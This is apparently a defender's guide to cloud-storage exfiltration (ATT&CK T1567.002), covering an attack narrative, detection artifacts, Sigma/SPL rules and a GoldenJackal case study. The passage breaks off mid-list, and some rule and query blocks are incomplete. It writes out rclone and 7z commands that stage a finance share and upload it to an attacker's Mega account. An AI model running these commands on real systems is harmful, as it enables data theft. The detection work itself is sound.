T1567.002 Exfiltration to Cloud Storage

In this technique, stolen data is uploaded to a cloud storage service instead of being sent out over the attacker’s normal command-and-control channel. Think of services like Mega, Dropbox, Google Drive, OneDrive, or an attacker-owned S3 or Blob bucket — most often reached with a command-line tool such as rclone or azcopy. Because that traffic is encrypted and looks like everyday file sync, it is one of the quietest ways to move a whole company’s data out of the network.

Tactic: Exfiltration ID: T1567.002 Parent: T1567 (Exfiltration Over Web Service) Platforms: ESXi · Linux · Windows · macOS Type: Sub-technique Technique version: 1.3 · created 09 March 2020 · last modified 12 May 2026

What happens

A tool such as rclone, azcopy, aws cli or a native sync client uploads whole folders — sometimes hundreds of gigabytes — to cloud storage the attacker controls or can read.

Chain position

Final stage of the attack chain. It is famous as the step that happens right before ransomware encryption in modern double-extortion attacks.

Biggest risk

Huge, fast and quiet. The upload can finish in a few hours, fully encrypted, and the encryption notice may arrive the same night — after the data is already gone.

Detect with

First-seen alerts for command-line (CLI) upload tools, rclone.conf file creation, proxy and cloud access security broker (CASB) upload-volume baselines, OAuth consent grants, and DNS/SNI hits on storage endpoints.

Overview

What this technique is, why it is one of the most damaging steps in modern attacks, and what this guide teaches you to do about it.

Exfiltration to Cloud Storage (T1567.002) means an adversary copies data out of a victim network by uploading it to a cloud storage service. Instead of streaming stolen files through a slow botnet channel, the attacker uses a normal, trusted service. Think Mega, Dropbox, Google Drive, OneDrive, Box, or their own S3 bucket or Azure Blob storage. The upload is usually done with a fast command-line tool such as rclone, azcopy, or aws s3 cp, or sometimes with the official desktop sync client itself.

The technique is popular for three simple reasons. First, the traffic is encrypted with TLS (Transport Layer Security, the same protocol that protects normal HTTPS), so defenders see only “HTTPS to a well-known provider”. Second, many companies already sync files to these providers, so one more host uploading files does not stand out by destination alone. Third, the bandwidth is effectively free — a tool like rclone can push hundreds of gigabytes in a few hours with parallel transfers, throttled only by the link itself.

In the attack chain, this technique sits at the very end, after the adversary has gained access, moved around, and collected data. That position gives it special weight: if you see it, the breach is already nearly complete. In ransomware cases it is also your best early warning. Many groups first copy the victim’s data to cloud storage, then — hours later — start encrypting. If you catch the upload, you may still prevent the encryption and the extortion call.

Why volume and identity are the real signals

Destination alone will not save you: attackers know which providers you whitelist. The strongest signals are behavior over time. A server that has never uploaded anything suddenly uploads tens of gigabytes. A tool that has never run on any host appears at 03:00. A user consents to an unknown app that can read every file in the tenant. This guide builds detections around exactly those ideas — tool first-seen, config-file creation, volume baselines, and identity events.

Good practice · Lab-only testing

Every red-team command in this guide is written for a lab you own. That means a test VM, a local S3 emulator such as MinIO, or your personal cloud account with dummy files. Never point these tools at systems, data, or accounts that are not yours. The goal is to understand the signals, not to hide from them.

The full written story (text alternative to the canvas)

Each step below lists what the attacker does, what the defender could see at that moment, and the evidence the story leaves behind. The node meanings are the same as above. The Attacker runs the operation, FS01 holds the data, and the Cloud node is the attacker’s Mega account. The SOC watches telemetry from EDR, the web proxy, and a CASB.

  1. Step 1 · Quiet before the storm. FS01 was compromised days earlier through a stolen VPN account for a backup vendor; a scheduled-task implant is active but idle. The attacker only beacons gently to blend in. What the defender sees: almost nothing in the moment — the only clue is one odd VPN login from a new country weeks ago, closed as a false positive. Evidence: VPN login from a new ASN (autonomous system number, the network’s identifier); one new scheduled task on FS01.
  2. Step 2 · Shopping for data. From the implant, the attacker sweeps the shares: dir /s walks over finance, HR and R&D folders to build a target list. What the defender sees: the EDR records a burst of around 1,400 directory listings in twelve minutes — at 03:00 local time, from a server that normally only serves files. Evidence: EDR process lines full of dir sweeps; off-hours share enumeration.
  3. Step 3 · Packing with a password. The attacker compresses the chosen shares into one archive: 7z a -p<hard-pass> C:\Windows\Temp\arc.7z \\FS01\finance (shown for lab practice only). A single password-protected file is far easier to upload than ten thousand small ones. What the defender sees: 7z.exe runs on a server for the first time ever, and a temp file starts growing toward gigabytes. Evidence: 7z first-seen on FS01; arc.7z growing in C:\Windows\Temp.
  4. Step 4 · The remote config appears. rclone is staged and configured: rclone config writes a remote named mega: into %APPDATA%\rclone\rclone.conf, holding the attacker’s cloud credentials. What the defender sees: a Sysmon (Microsoft’s system-monitoring agent) Event ID 11 file-create for rclone.conf — a filename that has never appeared anywhere in the estate — and the first execution of rclone.exe on record. Evidence: Sysmon 11 create of rclone.conf; rclone.exe never seen before.
  5. Step 5 · The upload. The main event: rclone copy C:\Windows\Temp mega:corp-backup pushes tens of gigabytes out, split across parallel TLS connections and shaped with --bwlimit to stay polite. What the defender sees: the proxy’s per-host upload bytes explode to about 50× the 30-day baseline for FS01, and the CASB flags an unmanaged cloud-storage app. This alert is the real warning window. Evidence: proxy bytes-up baseline break; CASB unmanaged-app event on mega.nz.
  6. Step 6 · Cleaning up. The attacker deletes arc.7z, wipes the staging folder, and touches a few file timestamps to confuse later review. What the defender sees: update sequence number (USN) journal delete records for the archive, and the EDR flags a mismatch between the $STANDARD_INFORMATION and $FILE_NAME timestamps — a classic timestomping hint. Evidence: USN delete of arc.7z; EDR timestamp-mismatch flag.
  7. Step 7 · Attacker downloads. On their own infrastructure, the attacker pulls the archive from Mega to keep a local copy. What the defender sees: nothing on the corporate side — the download happens entirely inside the cloud provider, between the attacker’s account and their devices. This is why cloud storage feels safe to attackers and why the earlier steps matter more. Evidence: no on-prem telemetry; provider account is attacker-controlled.
  8. Step 8 · Encryption follows. With the data safely copied, the attacker runs the ransomware: shares get encrypted, a note appears, and the extortion email quotes samples of the stolen files. What the defender sees: the SOC replay now shows the whole chain — and the rclone alert fired roughly six hours before the first encryption event. That gap was the warning window; this page exists to make sure it is never missed again. Evidence: encryption events (late); rclone alert timeline showing a ~6-hour lead.
Note · How to read the story

Notice the pattern across steps: the attacker’s most visible actions (steps 3–5) all happen on your side of the cloud boundary. Step 7 is invisible to you. Defenders win by alerting on steps 2–5 — before the cloud swallows the evidence.

Red Team Perspective: How Attackers Abuse Cloud Storage

Why operators pick cloud storage, what they need in place, and how the move looks from their side. All commands here are lab-only demonstrations.

Why this technique is so attractive

An operator choosing an exfiltration channel compares speed, cover, and cost. Cloud storage wins on all three. Accounts on consumer providers are free or cheap, and a single rclone process can saturate a link with parallel transfers. The traffic is TLS from end to end, so it hides among the same domains real employees use every day. And rclone speaks more than forty providers with one configuration file, so the same playbook works whether the attacker picked Mega, Google Drive, or their own S3 bucket this morning. For ransomware crews the math is even better: copying the data first doubles the leverage, because they can threaten both publication and encryption.

When and where attackers use it

Timing clusters around two windows. Ransomware crews run the upload in the final hours before encryption, often overnight, when volume alerts are staffed thin. Espionage and theft crews prefer long, low-volume transfers spread across days. Place matters too. The tool runs where the data already sits: file servers, admin workstations, and backup hosts. The destination is whatever provider the victim’s proxy does not block — consumer storage or attacker-owned S3 and Blob accounts.

Prerequisites

  • Network egress to the chosen provider (or to any provider that is not category-blocked at the proxy).
  • Data access — the collected file list from the earlier chain stages, ideally on a host that already touches the shares, such as a file server or an admin workstation.
  • Storage credentials — an account on the provider, an access key, or a SAS (shared access signature) token. Public reporting shows actors pre-create these accounts before the operation starts.
  • A staging step — usually one archive file (7z, zip, tar) so thousands of small files become one upload.

A safe lab walk-through

The sequence below reproduces the full chain safely. It uses a local S3 emulator (MinIO) running on your own machine and dummy files you created yourself. Nothing leaves your computer, and the resulting logs are perfect practice data for the detections in section 5.

Example lab commands (your own VM only):

While you run these, open a second terminal and watch what defenders would watch. Look for the process creation line (Sysmon Event ID 1) and the config file creation (Event ID 11). If you point the lab at a real provider with your own account, also check the proxy entry for its user agent and byte counts. This pairing is the heart of detection engineering for this technique.

Common variations

  • azcopy to an attacker-owned Azure Blob — a single Microsoft-signed binary and a SAS URL; looks like routine Azure admin work.
  • aws s3 cp to attacker S3 — common where AWS CLI already exists on the host.
  • MEGAcmd / megasync — the MEGA route documented in the ATT&CK C0015 campaign.
  • Native sync clients — drop files into a folder the Dropbox/OneDrive client syncs; the official app does the exfiltration.
  • Malicious OAuth apps — OAuth is the open standard for app authorization. These attacks need no binary: the victim consents to an app that then reads the cloud drive through the provider’s API (application programming interface).

Mistakes attackers make (and you should hunt for)

Operators slip in three predictable ways, and each slip is an easy detection for you. The default rclone user agent (rclone/v1.x) is a clean proxy-side signature. Uploading during business hours or in one flat, multi-hour burst breaks volume baselines far more than a shaped trickle would. And reusing the same storage account across victims means one intel report or one CASB watchlist entry can unmask the whole campaign. Section 5.5 turns each of these into a working rule.

Blue Team Perspective: What Defenders See

The artifacts this technique leaves behind, where to look first, and a short triage flow for the morning an alert fires.

From the defender’s chair, exfiltration to cloud storage is unusually generous with artifacts — but only if you collect them. Every stage of the story in section 2 writes a line somewhere: process telemetry, file events, proxy records, CASB events, DNS queries, and identity logs. The catch is that each single line looks harmless. A defensible detection program is about joining them: a first-seen tool, plus a config file, plus a volume break, equals an incident.

Artifacts to collect and keep

  • Sysmon Event ID 1 — process creation lines for rclone.exe, azcopy.exe, megasync.exe, aws.exe and curl.exe, with command lines, hashes and parents.
  • Sysmon Event ID 11 — creation of rclone.conf, staging archives like *.7z in temp folders, and dropped binaries.
  • Proxy / SWG logs — a secure web gateway (SWG) records the destination host, URL category, user agent, method, and especially bytes uploaded per host and per user.
  • CASB events — unmanaged-app usage, per-user cloud-storage volume, file activities, and OAuth app grants.
  • DNS / SNI telemetry — the domain name system (DNS) lookups and server name indication (SNI) values. Watch for mega.nz, storage.googleapis.com, *.blob.core.windows.net, S3 endpoints, from hosts that should never talk to them.
  • Identity logs — Azure AD / Okta OAuth consent events, app assignments, service-principal changes, and sign-ins for the accounts used.
  • DLP alerts — data loss prevention (DLP) content matches inside uploads, useful to upgrade an anomaly into a confirmed data-loss case.
Note · Where it fits the chain

This technique is the last domino. It follows collection (T1114 mail, T1005 files, T1213 documents) and usually precedes Impact (T1486 ransomware, T1487 account access removal). An exfil alert is therefore not “one weird event” — it is a statement that earlier stages already succeeded. Treat it with incident priority, not triage-priority.

Triage flow when the alert fires

  1. Confirm tool first-seen. Is this the first run of rclone/azcopy/megasync on this host in your whole retention window? If yes, the case is already strong.
  2. Find the config. Look for rclone.conf (or a --config flag in the command line) and read the remote it defines: provider, account, bucket name.
  3. Measure the volume. Pull the proxy/CASB numbers for the last 24–48 hours and compare with the 30-day baseline for that host and user.
  4. Identify the destination. Which provider, which exact bucket, is it on any allowlist, and is the account known to the business?
  5. Trace the grant origin. For OAuth cases: who consented, when, from which IP, and what scopes were granted?
  6. Contain the egress. Block the flow at the proxy or firewall mid-transfer if possible; isolate the host if the tooling re-runs from persistence.
  7. Rotate and hunt. Revoke tokens and keys in the config, reset involved accounts, then hunt estate-wide for the same config filename, hash, and user agent.
Good practice · Log the bytes

If your proxy or firewall can log upload bytes per connection, turn that on today. Almost every high-value detection in section 5.5 becomes easier — and far less false-positive-prone — when volume is part of the record. Without bytes, you are hunting with a destination list alone.

5.2 Threat Intelligence

Threat intel for this technique answers three questions: who exfiltrates to cloud storage, which tools they prefer, and which providers appear in current campaigns. You gather that picture from layered sources, analyze it into your own context, and apply it as detections and watchlists. Keep this cycle running: yesterday’s Mega-heavy campaign is today’s proxy watchlist entry, and tomorrow’s may favor attacker-owned S3 buckets.

Sources worth following

  • MITRE ATT&CK site and STIX/TAXII feeds — STIX/TAXII are the standard formats and transport for machine-readable threat data. The technique page for T1567.002 lists groups, software and campaigns (C0015, Akira, Chimera, Crutch and many more), and the feed lets you sync them into your tools.
  • Vendor blogs — Microsoft, Mandiant, CrowdStrike, ESET, Kaspersky and Red Canary publish incident write-ups with exact command lines, user agents, and provider names.
  • OSINT communities — open-source intelligence (OSINT) communities such as abuse.ch, Any.run, malware-traffic-analysis.net and vx-underground share samples and PCAPs where rclone or MEGAcmd traffic is visible in the wild.
  • Commercial feeds — Recorded Future and VirusTotal track infrastructure, such as the storage accounts reused across victims.
  • ISACs — information sharing and analysis centers (ISACs) such as MS-ISAC, FS-ISAC, H-ISAC, E-ISAC and ICS-ISAC share sector-relevant campaign notes, often with detections attached.
  • Internal telemetry — your own past incidents, honeypots and EDR history are the highest-signal feed you own; every former case becomes a baseline and a rule test.

From collection to application

Collection is the pull-and-subscribe work above. Analysis turns it into decisions: which providers to category-block, which tool hashes and user agents to alert on, which OAuth scopes to forbid. Application means the intel lands in controls — a CASB watchlist entry, a Sigma rule, a purple-team test — and you measure whether it would have caught your last incident. Intel that never changes a detection is a newsletter, not a capability.

Threat 1 rclone staging and bulk upload before ransomware

Log sources and key fields: Sysmon Event ID 1 (Image, CommandLine, OriginalFileName, User, ParentImage, Hashes), Sysmon Event ID 11 (TargetFilename, Image, ProcessGuid), and proxy logs (cs_host, c_useragent, sc_bytes/bytes uploaded, cs_method). The command line and the config-file path are the two fields that carry the most signal.

Normal: no rclone processes or config files anywhere; uploads on servers are near zero. Suspicious: a first-ever rclone execution, a --config flag pointing outside the standard install path, an archive growing in a temp folder, and a multi-hour HTTPS upload burst. Detection logic: alert when rclone runs for the first time on a host, especially alongside a config-file creation and a large upload. That combination appears in almost every pre-encryption case.

Threat 2 azcopy / aws cli to attacker-owned storage

Log sources and key fields: Sysmon Event ID 1 (Image, CommandLine), proxy logs (cs_host, cs_uri_path, cs_uri_query, c_useragent, sc_bytes), Azure storage platform logs (SAS token issuance and use: generateSasToken operations, account, principal), and DNS. Watch for SAS query strings (sig=, sv=, srt=o) moving off your tenant.

Normal: azcopy used by storage admins to known corporate accounts; aws s3 cp to company buckets. Suspicious: uploads to accounts created days ago, SAS signatures with long validity hitting unknown containers, and byte counts far above any job definition. Detection logic: correlate the process line with the proxy destination. Flag uploads to storage accounts that are not on the sanctioned list or that were never seen in the last 30 days.

Proxy record · azcopy PUT to attacker blob (key=value)
_ts=2025-11-18T03:41:02Z  src=10.20.4.11  dst=20.60.34.17  cs_method=PUT

  • cs_uri_query — SAS parameters (sv version, ss=b blob scope, sig signature) proving shared-key access.
  • sc_bytes — 700 MB in one request; multiplied across the night this becomes gigabytes.
  • c_useragent — AzCopy identifies itself by default; the version string also dates the tooling.

Threat 3 Native sync client abuse

Log sources and key fields: vendor sync-client logs and EDR process data (client version, account email), CASB app-activity events (user, app, activity, files, bytes, managed/unmanaged), and the provider’s own audit API (OneDrive/SharePoint or Dropbox events: file downloaded, shared, uploaded). The per-user upload volume over time is the anchor field.

Normal: steady, user-sized sync traffic tied to work hours and business accounts. Suspicious: personal-account sync on a corporate device, a folder dump of thousands of files in minutes, or sync volume 10–50× the user’s 30-day norm. Detection logic: baseline upload bytes and file counts per user and alert on large deviations, with a separate high-severity path when the destination is a personal (unmanaged) account.

Threat 4 Malicious OAuth app granted drive access

Log sources and key fields: Azure AD / Entra ID (Microsoft’s cloud identity service) audit logs (Operation “Consent to application”, initiatedBy, targetResources, scopes), Microsoft Graph API activity per application id, Okta system log (app user consent events), and CASB SaaS visibility. Key fields: consenting user, client app id, requested scopes, consent source IP.

Normal: consents to vetted first-party apps, often triggered by admin; scopes limited to profile and basic reads. Suspicious: user-initiated consent to unknown multi-tenant apps requesting Files.Read.All, Sites.Read.All or mail scopes, especially followed by high-volume Graph calls from hosting-provider IPs. Detection logic: alert on any consent where the app is not in the approved register and the scopes include broad read or write permissions. Then review the app’s subsequent API volume.

Threat 5 RAT / cloud C2 with staging in storage buckets

Log sources and key fields: DNS logs (client, query, qtype, answer), proxy logs (cs_method, cs_host, cs_uri_path, bytes in/out), and EDR network events (process to destination mapping). The object prefix in the URI path is the identifier: implants reuse the same prefix for polling.

Normal: humans access provider APIs at working hours with varied paths; sync traffic is bulky and bursty. Suspicious: a server-side process performing metronome-regular PUT/GET requests (the storage API’s upload and download calls) to one object prefix, around the clock, with tiny payloads and no human interaction. Detection logic: group storage-endpoint traffic by source host and URI prefix, then flag low-and-slow periodic patterns — many small requests at fixed intervals is C2 behavior, not sync.

DNS log · periodic lookups to a storage endpoint
2025-11-18T02:58:31Z  client=10.20.4.11  query=corpbackup123.blob.core.windows.net  qtype=A  answer=20.60.34.17  ttl=300  rcode=NOERROR
2025-11-18T03:04:12Z  client=10.20.4.11  query=corpbackup123.blob.core.windows.net  qtype=A  answer=20.60.34.17  ttl=300  rcode=NOERROR
2025-11-18T03:10:02Z  client=10.20.4.11  query=corpbackup123.blob.core.windows.net  qtype=A  answer=20.60.34.17  ttl=300  rcode=NOERROR
  • client — a file server that should resolve only internal and update domains.
  • query — the same unknown tenant name every ~5 minutes: beacon-like periodicity.
  • answer — a single stable address; pair with proxy PUT records to the same host to confirm the channel.

Threat 6 Backup tooling repurposed for mass upload

Log sources and key fields: Windows Security Event ID 4698/4699 (scheduled task created/deleted: TaskName, TaskContent, SubjectUserName), backup vendor audit logs (job definition changes, target change), Sysmon Event ID 1 for the job’s child processes, and proxy volume for the host. The job definition diff is the core evidence.

Normal: backup jobs change rarely, through change tickets, and point at the documented repository. Suspicious: a task created or edited outside change windows, referencing upload CLIs or new remote targets, running at unusual hours, or a backup service account suddenly generating internet uploads. Detection logic: alert on task or job-definition creation whose content references upload tools or new external targets, and require a matching change ticket for anything that alters the backup destination.

5.5 Sigma Rules and Splunk SPL

One detection package per threat from 5.3: a complete Sigma rule (all thirteen keys, ready for any converter), a matching Splunk SPL (Search Processing Language) query, the mapping rationale, expected false positives, and tuning guidance. The UUIDs (unique identifiers) are invented for this guide and stable — do not reuse them for other rules. Index and sourcetype names are realistic defaults; always adapt them to your own environment before deploying.

Note · Reading the rules

Sigma conditions use the standard grammar (1 of selection_*, aggregations with count() by and a timeframe). SPL queries assume the stated field names; where your schema differs (for example bytes instead of sc_bytes), change the field, not the logic.

Threat 1a Rclone execution — Sigma (process creation)

Mapping: the single highest-value endpoint signal for the pre-ransomware pattern. First-seen execution of rclone on any host is rare in most estates and appears in C0015, Akira and Conti-style reporting.

Sigma · rclone execution
title: Rclone Command-Line Tool Execution

status: stable

Severity: high; critical when the same host also shows staging archives (rule 1b pattern plus proxy volume).

Threat 2 azcopy / aws cli uploads — Sigma (proxy) and SPL (volume)

Mapping: the strongest visible artifact of native-CLI theft is on the wire: the AzCopy user agent and SAS query strings leaving to a tenant that is not yours. The proxy sees what the endpoint never logs.

Sigma · azcopy uploads to non-corporate blob storage
title: AzCopy Upload to External Blob Storage
id: 3da861fd-ba94-417a-b7a7-13de9ae437c4
status: test
description: >-
  Detects AzCopy upload traffic to Azure Blob Storage endpoints. AzCopy is a signed
  Microsoft binary routinely abused to copy data to attacker-owned storage accounts
  using a SAS token. Volume against unlisted tenants is the discriminator, so the
  rule pairs the user agent with a request-size aggregation.
references:
  - https://attack.mitre.org/techniques/T1567/002/
  - https://learn.microsoft.com/en-us/azure/storage/common/storage-use-azcopy-v10
author: ATT&CK Guide Project — detection engineering team
date: 2025-11-20
logsource:
  category: proxy
detection:
  selection_agent:
    c-useragent|startswith: 'AzCopy/'
  selection_host:
    cs-host|endswith: '.blob.core.windows.net'
  condition: selection_agent and selection_host | count() by src_ip > 10
  timeframe: 1h
fields:
  - src_ip
  - cs-host
  - cs-method
  - cs-uri-path
  - c-useragent
  - bytes

  - Large but legitimate migration or DR-drill uploads by the storage team. Exempt approved source ranges and tenants.

| bin _time span=1h
| stats count AS requests, values(cs_uri_path) AS paths
        by src_ip, _time

Field assumptions: proxy fields use the common cs_* naming; the query mirrors the Sigma logic exactly — AzCopy user agent plus Blob Storage endpoint, binned into 1-hour windows, more than 10 requests from one source IP. False positives: the storage team’s own large copies; DR (disaster-recovery) drills. Tuning: whitelist by tenant name and source subnet, and keep any byte threshold per host class (servers tolerate higher values). Severity: high — unknown tenant plus AzCopy plus a request burst is the reported IR pattern.

| table _time, Computer, SubjectUserName, TaskName, TaskContent
| sort - _time

Field assumptions: standard Security log forwarding into index=wineventlog; TaskContent is extracted by default Splunk Windows TA parsing. The regex mirrors the Sigma’s four case-sensitive contains values; for a wider, case-insensitive hunt use (?i)(rclone|azcopy|megasync|dropbox|aws\.exe) as a documented expansion. False positives: approved jobs using these tools — rare, and easy to inventory. Tuning: pair the alert with the change-ticket system: any hit without a matching ticket is an incident, any hit with one is auditable change. Severity: medium on servers; upgrade to high when the task runs under a backup service account and proxy volume for that host rises in the same window.

Good practice · Test before you trust

Replay the section 2 story in your lab (a VM plus a local S3 emulator is enough) and confirm each rule fires: process first-seen, config file, volume break, task creation. Purple-team the rules quarterly — detection content that has never fired in a test will not fire in an incident either.

Real-World Case Study: GoldenJackal

An espionage actor that combined USB worms with Google Drive exfiltration against government networks — proof that this technique is not only a ransomware problem.

Context. GoldenJackal is an espionage-motivated threat actor that has targeted government and diplomatic entities in Europe, the Middle East and South Asia since at least 2019. In September 2024, ESET published detailed research (“GoldenJackal: GoP-style threats”) describing two distinct toolsets. The first is written in .NET and includes the JackalControl implant, the JackalWorm USB worm, JackalPerformer and JackalScreenWatcher. The second is written in Go and includes JackalStream, a tool that archives collected files and uploads them to Google Drive — exactly the technique this page covers. Public reporting describes victims including a government entity in Europe and an embassy of a South Asian country, and highlights the actor’s ability to bridge air-gapped networks. JackalWorm spreads by USB stick, moving target files to internet-connected hosts. JackalStream then exfiltrates them to the cloud.

Note · Honest sourcing

The campaign facts above summarize ESET’s public reporting of September 2024. The incident narrative below is an illustrative composite based on that public reporting — it shows how the chain typically unfolds and how defenders catch it. It is not a description of one specific named victim’s internal response.

Illustrative incident timeline

  • 2019 onward

    GoldenJackal operations are observed against government and diplomatic networks. The actor maintains two parallel toolsets, .NET and Go, reusing jackal-themed names throughout.

  • Day 0

    An insider or visitor carries an infected USB device into the organization. On an air-gapped workstation, JackalWorm infects removable drives and begins copying target documents onto the stick when it is next mounted on other machines.

  • Days 1–14

    The worm ferries collected files across the air gap to a host that has internet access. On that host, JackalControl-style implants stage the data; JackalScreenWatcher adds screenshots of classified-looking work.

  • Day 15

    JackalStream compresses the staged folder into archives and uploads them to an actor-controlled Google Drive account using embedded Google API credentials. Traffic is plain HTTPS to a fully legitimate provider domain.

  • Day 15 + 2 h

    Detection point. The SOC’s alert fires on correlation: a rare, never-before-seen binary on an internet-connected host, and cloud-drive upload volume far above that host’s baseline. The tie-breaker: USB device write events on the same host within the previous days.

  • Day 15 + 3 h

    Containment. The host is isolated, the Drive endpoints are blocked at the proxy for the whole estate, and the USB ports of sensitive systems are locked down by policy pending review.

  • Days 16–20

    Eradication. Worm and implants are removed using ESET’s published indicators; credentials exposed on affected hosts are rotated; every host that ever mounted the infected stick is rebuilt from trusted media.

  • Days 21–30

    Recovery. Services return from clean backups, device-control rules move to default-deny for removable media, and storage egress baselines are rebuilt with the incident’s traffic as the new “known bad” example.

The attack chain, step by step

  1. Physical introduction — an infected USB device crosses into the air-gapped network; JackalWorm autoruns and infects the drive.
  2. Collection — the worm and implants select documents of intelligence value on both sides of the gap.
  3. USB relay — the same stick, reused between networks, carries the files to an internet-connected host.
  4. Staging — archives are built on the connected host, mirroring the 7z staging from this guide’s simulation.
  5. Cloud exfiltration (T1567.002) — JackalStream uploads the archives to Google Drive with hardcoded API credentials.
  6. Retrieval — the actor downloads the data from their own Drive account — invisible to the victim’s network, exactly like step 7 of the simulation.

Why the detection worked

No single telemetry source caught GoldenJackal here. The endpoint saw a rare binary; the proxy saw unusual upload volume to a legitimate provider; the device-control log saw USB writes. The detection fired because the three were correlated. This is the repeating lesson of cloud-storage exfiltration: each signal alone is deniable, together they are conclusive. Teams that log but do not join these sources see the same breach twice — once as noise, once as the incident report.

Impact and consequences

Operational impact. The victim organizations lost control of classified and diplomatic material for an unknown period. Investigators had to treat every document that passed through the infected hosts as compromised, and remediation pulled skilled staff away from normal work for weeks.

Legal and policy impact. A government breach of this kind triggers national security-review procedures and, where personal data was taken, the breach-notification duties described in section 5.1. The undefined exfiltration window is what makes the legal assessment hard: you must report on data you cannot fully list.

Impact on people. For citizens and diplomatic partners, the breach means their information now sits in an adversary’s cloud storage — a privacy harm that no recovery step can undo. The case also widens the audience for this page: exfiltration to cloud storage is not only a ransomware problem. Espionage crews reach for the same trusted providers, so the same detections apply.

Team response and communication

The composite response followed the order that works. Contain first (isolate, block, lock down ports). Then eradicate with vendor indicators, then recover, and only then write the report. Because a government network was involved, communications ran on two tracks: an operational bridge between SOC, IT and leadership, and a legal/protocol track assessing classification and notification duties. The incident report itself led with the exfiltration evidence — upload volume, destination account, and file list — because that evidence defines the breach scope for every follow-up decision.

Lessons learned

  • The physical + cloud chain defeats single-layer controls. Air-gapped networks with permissive USB use and unmonitored storage egress are not truly disconnected.
  • Correlate USB events with storage egress. A host writing to removable media and then uploading to a cloud drive is a pattern worth its own alert.
  • Legitimate providers need behavioral detection. Blocking Google Drive outright is rarely possible; volume baselines and first-seen tooling are what remain.
  • Intel shortens the hunt. ESET’s published indicators let defenders sweep months of history in hours — retrohunting is part of recovery, not an optional extra.

Mitigation and Defense

Controls that make cloud-storage exfiltration hard, ordered from policy to response — plus what home users and small offices should do, and a prioritized action table.

You cannot remove this technique from the attacker menu, but you can shrink it dramatically. The controls below work as a stack. Policy decides what may leave, identity limits who can approve apps, and endpoint watches for upload tools. Network enforces and measures egress, and monitoring turns the leftover signals into alerts. No single layer is sufficient — the GoldenJackal case in section 6 is the proof — but each layer raises cost and noise for the attacker.

Policy

Write an explicit data-egress policy: which storage providers are approved, for whom, and for what data. Require change tickets for any job or task that moves data off-site, and review exceptions quarterly.

Identity

Run OAuth governance: admin-consent workflow on by default, a register of approved apps, no legacy authentication, and periodic review of enterprise app grants. Section 5.5’s consent rule becomes high-fidelity when governance is real.

Endpoint

Alert on first-seen rclone/azcopy/megasync per host, and block or allowlist upload CLIs on servers. Enforce device control for removable media — the air-gap bridge from section 6 starts here.

Network

Enforce storage categories at the proxy (default-block unapproved consumer storage), keep lawful TLS inspection where policy allows, log upload bytes everywhere, and build per-host egress baselines.

Cloud

Deploy a CASB to see managed and unmanaged app usage. Restrict personal-account sync on corporate devices. Use tenant restrictions so corporate credentials cannot be used from your network against personal tenants.

Logging

Ship Sysmon 1/11, full proxy records, DNS, CASB, and Azure/Okta audit events into the SIEM (security information and event management system) with at least 12 months retention. Without bytes and command lines, none of the section 5.5 rules can run.

Monitoring

Keep per-host upload-volume baselines, first-seen tooling alerts, and the OAuth consent review on a schedule. Test detections quarterly with the lab replay from section 2.

Backup

Keep backups immutable and off-domain, and control job definitions: any change to a backup destination requires a ticket. This kills the “backup tooling repurposed” threat (5.3, threat 6).

Response

Maintain the runbook from section 4’s triage flow. Block mid-transfer, revoke tokens and keys found in configs, rotate exposed secrets, and hunt estate-wide for the same config, hash and user agent.

Home and small-office advice

The same attack pattern works against small organizations and home offices, with fewer tools but the same logic. Review which apps have access to your cloud drives (Google, Microsoft and Dropbox all have an “apps with access” page) and remove what you do not recognize. Turn on multi-factor authentication everywhere — most small-office breaches start with a reused password, not a zero-day. Keep one cloud account for work files and a different one for personal sync, so one stolen credential cannot reach both. Finally, if you back up to cloud storage, protect the backup account with MFA too, and check occasionally that no unknown device is signed in.

Common Mistakes and Best Practices

Twelve concrete blue-team mistakes seen in real programs — each with the symptom you notice, the root cause, the fix, and the habit that prevents it.

Most teams do not miss this technique because it is hard to detect. They miss it because of process gaps: a category trusted too much, a consent page nobody re-reads, a volume baseline that was never built. Read the list once a quarter and honestly score your own program — the mistakes are deliberately written so you can check for each one in under an hour.

1 · Treating upload CLIs as “just admin tools”

Symptom: rclone and azcopy ran on servers for weeks; nobody noticed until the incident.

Root cause: no first-seen alerting for process names outside an approved software list.

Fix: deploy the 5.5 threat 1 and 2 rules and run a two-week discovery window.

Prevention: make “new tool on a server” a standing alert class, not a one-off.

2 · No alert on rclone.conf creation

Symptom: the config file existed on a compromised host for days; the team found it during forensics, not monitoring.

Root cause: file-event telemetry exists (Sysmon 11) but nobody wrote a rule for this filename.

Fix: deploy the rclone.conf rule from 5.5 and retrohunt the whole retention window.

Prevention: maintain a small watchlist of high-signal filenames (rclone.conf, id_rsa, wp-config.php).

3 · Trusting “cloud backup” URL categories wholesale

Symptom: proxy policy allows every site in the storage category; exfil rides the whitelist.

Root cause: category labels describe content, not ownership — attacker buckets sit in the same category as your sanctioned provider.

Fix: switch storage egress to tenant-level allowlists plus volume monitoring for the rest.

Prevention: review category exceptions monthly; attackers read your policy too.

4 · OAuth consents never reviewed after setup

Symptom: dozens of apps hold Files.Read.All; nobody can say who approved them.

Root cause: admin-consent workflow disabled for convenience at rollout, then forgotten.

Fix: enable admin consent, inventory existing grants, revoke unexplained ones.

Prevention: quarterly app-grant review with named owner (see section 7, Identity).

5 · Proxy logs without byte counts

Symptom: you know a host touched mega.nz but cannot tell a click from a 48 GB upload.

Root cause: proxy deployed for URL filtering only; volume fields disabled to save space.

Fix: enable bytes in/out logging and rebuild baselines from 30 days of fresh data.

Prevention: treat byte fields as first-class detection data, not diagnostics.

6 · Volume alerts that fire on every backup run

Symptom: the baseline rule alerted 200 times in month one; analysts muted it.

Root cause: one global threshold instead of per-host, per-role baselines.

Fix: rebuild thresholds by host class and business calendar (backup windows excluded).

Prevention: every volume rule ships with its expected alert budget — tune to meet it.

7 · Alert fatigue: DLP noise buries real exfil

Symptom: thousands of low-value DLP events per week; the real upload was one ticket among many.

Root cause: content rules with no ranking, no context, and no automatic enrichment.

Fix: rank DLP hits by data class, destination risk, and volume; auto-attach proxy context.

Prevention: review the top alert sources monthly and tune or retire the worst.

8 · No DNS/SNI coverage for servers

Symptom: workstations are covered, but the file server’s beacon to a storage tenant was invisible.

Root cause: DNS logging treated as a workstation feature; server VLANs missed.

Fix: forward DNS for all VLANs to the SIEM and re-run the threat 5 rules.

Prevention: coverage matrix per data source per host class, reviewed quarterly.

9 · Ownership gaps for cloud governance

Symptom: CASB policy drifts; nobody owns the provider allowlist or the OAuth register.

Root cause: the control spans IT, security and identity — so everyone assumed someone else had it.

Fix: assign a named owner and a monthly review slot for storage egress policy.

Prevention: add these controls to the on-call runbook and the audit calendar.

10 · Assuming exfil only happens on laptops

